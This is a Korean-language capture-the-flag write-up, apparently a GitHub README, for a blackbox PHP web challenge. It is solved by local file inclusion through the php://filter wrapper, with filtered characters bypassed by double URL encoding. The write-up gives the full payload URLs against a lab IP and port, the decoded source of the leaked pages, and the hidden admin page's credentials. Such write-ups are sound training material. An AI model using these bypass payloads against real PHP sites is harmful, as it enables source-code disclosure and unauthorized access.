# black cow in the box
![js](https://img.shields.io/badge/PHP-777BB4?style=for-the-badge&logo=php&logoColor=white)

## 개요
 - 스틸리언교육에서 풀어본 keris 제9회 blackbox 문제입니다.
 - lfi 인건 알고있었지만 조금 특이하게 풀이를 하는경향이 있어 문제해결에 어려움이 있었던것같습니다.
 - Source코드는 제공되지 않았습니다.

## Preview
![image](https://github.com/ChCh0i/steel/assets/108965611/6a37b99d-c2f3-4f07-be76-b4cdd7841398)
![image](https://github.com/ChCh0i/steel/assets/108965611/2932dd52-7843-4fc6-9faf-62566610735c)

## 시나리오
 - 먼저 param 입니다.

![image](https://github.com/ChCh0i/steel/assets/108965611/b6fb81c7-8f2e-41c0-a9fe-ae8dfdf7f549)
 - 파라미터의 값을 보면 GET_method를 통해 p라는 변수를 지정하였고 메인페이지를 로딩할때 check라는 값이 들어가는것을 확인할수있습니다.
 - 값을 아무 dummy data 로 바꾸었을시 아래와같이 공백의 페이지가 출력되는것을 확인할수있었습니다.
![image](https://github.com/ChCh0i/steel/assets/108965611/c89947b6-28f2-4993-8999-637f0170ff20)
 - 이때 부터 local file 을 include 하여 페이지를 불러오는것을 예상하였고 file 이 include 될때 .php라는 확장자가 암묵적으로 붙는다는것을 예상했습니다.
 - 저희는 아무런 소스코드를 제공받지않았고 해당 내용만으로는 flag에 접근할수없기에 main부터 소싱되는 page의 소스를 보기위해 check.php 라는 파일의 내용을 읽기위해 php wrapper를 활용하여 local file inclusion 공격을 시행하였습니다.
 - 공격을 실행하던중 필터링되었던 특정문자들이 있었고 공격에 필요한 문자중 필터링된 문자들과 필터링되었을때 페이지는 다음과 같습니다.
![image](https://github.com/ChCh0i/steel/assets/108965611/512c8867-d21c-4cfd-96a9-cc7ac5f8fc54)

```
. & -
```
 - 해당 문자들을 우회하기위해 url encoding을 한번더 encoding하는 double encoding을 활용하였고 double encoding된 문자들은 다음과 같습니다.
```
%252E & %252D
```
 - 우회된 해당 문자들을 이용하여 check.php에 해당하는 파일을 base64로 인코딩된 텍스트로 출력
```
http://13.125.23.252:11050/?p=php://filter/convert%252Ebase64%252Dencode/resource=check
```
 - 해당페이지를 소스하면 다음과 같은 페이지 출력
<img width="1470" alt="image" src="https://github.com/ChCh0i/steel/assets/108965611/991b5f05-7729-4e02-b79a-7f2c99bc83ed">
 - 위 내용을 아래와같이 base64 decode

```
<?php
    $username = $_POST['username'];
    $password = $_POST['password'];

    if ($_SERVER["REQUEST_METHOD"] !== "POST") {
        header('Location: /');
        exit;
    }

    if ($username && $password) {
        if ($username === "Th15_P4g3_15_F4k3!!" && $password === "H4H4") {
            header('Location: /');
        }
        else {
            echo "<script>
            alert('ìì´ë í¹ì ë¹ë°ë²í¸ë¥¼ íì¸í´ì£¼ì¸ì.');
            window.location.href='/';
            </script>";
        }
    }
?>
```
 - 해당 페이지 내용을 보면 지금 보여지는 check.php라는 페이지는 fake라는것을 알수있다.
 - 다른페이지를 찾던중 메인에 로딩되던 페이지가 login form이라는것을 우리는 알고있고 해당 폼을 근거로 login.php라는 페이지가 있지않을까해서 탐색
```
http://13.125.23.252:11050/?p=php://filter/convert%252Ebase64%252Dencode/resource=login
```
<img width="1470" alt="image" src="https://github.com/ChCh0i/steel/assets/108965611/07039d0d-e83a-419c-8364-cb4ea557edac">
 - login이라는 페이지가 존재하여 해당 리소스값을 base64로 가져오는것을 확인할수 있었고
 - 해당 소스 decode
```
<div class="container">
        <div class="row">
            <div class="col-lg-3 col-md-2"></div>
            <div class="col-lg-6 col-md-8 login-box">
                <div class="col-lg-12 login-key">
                </div>
                <div class="col-lg-12 login-title">
                    LOGIN
                </div>

                <div class="col-lg-12 login-form">
                    <div class="col-lg-12 login-form">
                        <?php
                            /* HOW DID YOU FIND IT? */
                            /* <form action="l0g1nW1th4dm1n.php" method="post"> */
                        ?>
                        <form action="/?p=check" method="post">
                            <div class="form-group">
                                <label class="form-control-label">USERNAME</label>
                                <input type="text" name="username" class="form-control">
                            </div>
                            <div class="form-group">
                                <label class="form-control-label">PASSWORD</label>
                                <input type="password" name="password" class="form-control" i>
                            </div>
                            <div class="col-lg-12 loginbttm">
                                <div class="col-lg-6 login-btm login-text">
                                </div>
                                <div class="col-lg-6 login-btm login-button">
                                    <button type="submit" class="btn btn-outline-primary">LOGIN</button>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
                <div class="col-lg-3 col-md-2"></div>
            </div>
        </div>
        <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
        <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    </body>

 - 해당 코드를 보았을때 l0g1nW1th4dm1n.php 에 post method로 접근하여 username=th1s_i5_4dnn1n&password=q1w2e3r4 를 입력하면 플래그가 출력된다.


## payload
<img width="759" alt="image" src="https://github.com/ChCh0i/steel/assets/108965611/c5382dfa-69e3-497f-ab7a-f2be21a9481d">

## 마무리
 - 해당 공격을 실행할때 웹에 명시된 버전과 apache의 버전이달르다는것을 모르고 burp suite로 공격실습시 content-type 명시를 하지못하여 대충 1~2시간정도 잡아먹은것같다.
 - 앞으로 method 변경시 content-type을 유형별로 잘 입력해야될것같다.
